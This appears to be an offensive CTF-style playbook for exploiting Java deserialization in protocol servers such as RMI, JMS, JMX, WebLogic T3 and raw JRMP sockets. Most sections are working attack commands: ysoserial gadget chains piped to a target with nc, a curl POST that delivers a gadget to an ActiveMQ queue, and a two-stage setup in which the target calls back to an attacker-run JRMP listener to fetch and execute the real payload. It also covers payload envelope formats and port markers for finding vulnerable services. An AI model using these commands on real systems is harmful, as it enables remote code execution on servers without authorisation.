# Java Protocol Servers — the deserialization sinks inside daemons

## The shape — the sink isn't HTTP

Java deserialization sinks live inside protocol servers — RMI, JMS, JMX,
custom binary protocols, IIOP, JRMP — not just the web endpoint. The bug
reaches the same `readObject`, the delivery is a protocol frame instead of
a POST body.

## The servers that deserialize

| Server | The sink | Marker |
|---|---|---|
| RMI registry/server | `UnicastRemoteObject` reads serialized args | `:1099`, stub classes |
| JMS broker | `ObjectMessage.getObject` on a queue msg | ActiveMQ/OpenMQ/RabbitMQ-JMS |
| JMX connector | `MBeanServer` deser on invoke | `:1099`, `service:jmx:rmi://` |
| JRMP | raw `readObject` on the wire | `aced` in a JRMP frame |
| IIOP/CORBA | `read_object` on a GIOP stream | `:9001`, `iiop://` |
| WebLogic T3 | `readObject` on T3 frames | `:7001` |
| JBoss remoting | `readObject` on remoting | `:4447`/`:1099` |
| Kafka consumer | `ObjectDeserializer` | `:9092` |
| Akka remote | `JavaSerializer` | `:2552` |

## The JRMP direct path — the most common CTF shape

A server accepts a raw Java-serialized object on a socket. The frame is
`aced0005...` — send a ysoserial blob directly:

```bash
java -jar ysoserial.jar CommonsCollections6 'id' >cc.ser
cat cc.ser | nc TARGET 9001          # the raw frame IS the stream
# or wrap in the JRMP envelope if the server expects the handshake:
java -cp ysoserial.jar ysoserial.exploit.JRMPClient <target> <port>
```

## The JMS `ObjectMessage` sink

```java
// app-side:
ObjectMessage msg = session.createObjectMessage(ois.readObject(in));
// or:
Object o = ((ObjectMessage) msg).getObject();   // ← readObject on a JMS msg
```

Send a serialized gadget as the `ObjectMessage` body to the queue the app
consumes — the consumer's `getObject` triggers it.

```bash
# ActiveMQ-style: POST to the queue endpoint
curl -X POST "http://TARGET:8161/api/message?destination=queue://x" \
  --data-binary @gadget.ser \
  -H 'Content-Type: application/x-java-serialized-object'
```

## The JMX invoke sink

```java
// an MBean whose operation takes a serialized/typed arg:
mbean.invoke("setValue", new Object[]{serialized}, new String[]{"..."});
```

JMX connectors (`service:jmx:rmi://host:port/jndi/rmi://...`) deserialize
the invoke args — a `MarshalledObject`-wrapped gadget reaches the MBean.

## The WebLogic T3 family

`T3`/`T3s` on `:7001` — the `readObject` on T3 protocol frames. CVE-2016-
3510/2018-2628/2893/3245 family — the payload is wrapped in a T3 header.
ysoserial doesn't emit T3 — dedicated exploit scripts wrap the gadget bytes
in the T3 envelope.

## The second-stage JRMP trick — the two-hop

```bash
# 1. your listener serves the real chain:
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 'id'

# 2. the payload sent to the target is just:
java -jar ysoserial.jar JRMPClient YOUR-IP:1099 >jrmp.ser

# 3. target readObject → UnicastRef connects to your listener →
#    listener hands it the real CC6 → target runs it
```

The outer payload uses only JDK classes — the target's libraries don't
matter for the OUTER stream. The listener serves the library-matched inner
chain. Use when the target's classpath isn't fingerprintable but egress
reaches you.

## The "no HTTP, just a socket" delivery

Some CTF challenges are a raw TCP service — the "endpoint" is a socket
that reads a serialized object. `netcat`/`socat` the blob:

```bash
cat gadget.ser | nc TARGET 5000
# or with a length-prefix the protocol expects:
python3 -c "import sys;d=open('g.ser','rb').read();sys.stdout.buffer.write(len(d).to_bytes(4,'big')+d)" | nc TARGET 5000
```

## The protocol-envelope detail — what wraps the stream

- **JRMP**: `JRMI` magic + version + stream — a bare `aced` may not parse
- **T3**: `t3 12.1.3\nAS:...\nHL:...\n\n` + the stream
- **JMS**: the message envelope carries the `ObjectMessage` body
- **IIOP/GIOP**: a CORBA request frame — complex; use a client
- **custom**: a length-prefix or a small header then `aced`

`java_ser.py` the captured frame to see where the `aced` boundary sits —
the envelope is usually `<header><aced...>` — extract the stream offset
and deliver your gadget at the same offset.

## The "not the app's protocol" falsifier

- The socket accepts a length-prefixed stream but routes it to a text
  parser, not `readObject` — a `StreamCorruptedException` on your bytes
  proves the `readObject` exists; silence means it doesn't.
- The endpoint is HTTP-deserialized by a DIFFERENT serializer (JSON/XML) —
  a `readObject` grep on source settles it.

## Output to record

- The protocol (JRMP/T3/JMS/JMX/custom) + the envelope offset of `aced`
- The chain name + the listener command if two-stage
- The verbatim response/callback proving the gadget fired
